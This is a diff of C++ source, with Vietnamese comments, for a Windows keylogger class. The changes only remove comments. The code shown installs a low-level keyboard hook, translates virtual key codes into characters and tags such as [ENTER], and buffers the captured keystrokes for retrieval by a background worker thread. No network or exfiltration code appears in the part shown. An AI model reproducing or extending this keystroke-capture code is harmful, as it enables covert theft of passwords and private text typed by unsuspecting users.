@@ -2,7 +2,7 @@
 
 // --- BIẾN TOÀN CỤC ---
 HHOOK hHook = NULL;
-KeyLogger* g_LoggerInstance = nullptr; // THÊM: Con trỏ trỏ về đối tượng logger hiện tại
+KeyLogger* g_LoggerInstance = nullptr;
 
 // --- HÀM CALLBACK CỦA WINDOWS ---
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -10,7 +10,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
         int key = pKeyBoard->vkCode;
 
-        // KIỂM TRA: Nếu có instance logger thì gọi hàm xử lý của nó
         if (g_LoggerInstance != nullptr) {
             g_LoggerInstance->OnKeyPressed(key);
         }
@@ -18,7 +17,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
-// --- CÁC HÀM TRONG CLASS KEYLOGGER ---
 
 // 1. Hàm xử lý khi có phím nhấn (Được gọi từ KeyboardProc)
 void KeyLogger::OnKeyPressed(int key) {
@@ -40,15 +38,14 @@ std::vector<std::string> KeyLogger::GetAndClearLogs() {
     // Xóa sạch buffer cũ để đón phím mới
     buffer.clear();
 
-    return data; // Trả về dữ liệu đã lấy
+    return data;
 }
 
 // 3. Hàm định dạng chuỗi (Logic của bạn)
 std::string KeyLogger::logKeystroke(int key) {
     std::string result = "";
 
-    // --- 1. XỬ LÝ CÁC PHÍM CHỨC NĂNG (SPECIAL KEYS) ---
-    // Chúng ta return ngay để không bị xử lý nhầm thành ký tự văn bản
+    // --- 1. XỬ LÝ CÁC PHÍM CHỨC NĂNG ---
     switch (key) {
     case VK_RETURN: return "[ENTER]\n";
     case VK_BACK:   return "[BACK]";
@@ -60,8 +57,8 @@ std::string KeyLogger::logKeystroke(int key) {
     case VK_INSERT: return "[INS]";
     case VK_HOME:   return "[HOME]";
     case VK_END:    return "[END]";
-    case VK_PRIOR:  return "[PGUP]"; // Page Up
-    case VK_NEXT:   return "[PGDN]"; // Page Down
+    case VK_PRIOR:  return "[PGUP]"; 
+    case VK_NEXT:   return "[PGDN]"; 
 
     case VK_LEFT:   return "[LEFT]";
     case VK_UP:     return "[UP]";
@@ -71,7 +68,7 @@ std::string KeyLogger::logKeystroke(int key) {
         // Bỏ qua các phím bổ trợ nếu chúng đứng một mình (để đỡ rác log)
     case VK_SHIFT:   case VK_LSHIFT:   case VK_RSHIFT:
     case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
-    case VK_MENU:    case VK_LMENU:    case VK_RMENU: // Alt
+    case VK_MENU:    case VK_LMENU:    case VK_RMENU: 
     case VK_CAPITAL: case VK_NUMLOCK:  case VK_SCROLL:
         return "";
 
@@ -98,7 +95,7 @@ std::string KeyLogger::logKeystroke(int key) {
 
     // B3: Dùng ToAscii để dịch mã phím + trạng thái phím -> Ký tự
     WORD asciiChar = 0;
-    // MapVirtualKey chuyển VK code sang Scan code
+
     UINT scanCode = MapVirtualKey(key, MAPVK_VK_TO_VSC);
 
     // Hàm ToAscii trả về số lượng ký tự copy được vào buffer
@@ -141,7 +138,6 @@ void KeyLogger::WorkerThread() {
 void KeyLogger::Start() {
     if (isRunning) return;
 
-    // Gán con trỏ toàn cục vào chính đối tượng này
     g_LoggerInstance = this;
 
     isRunning = true;
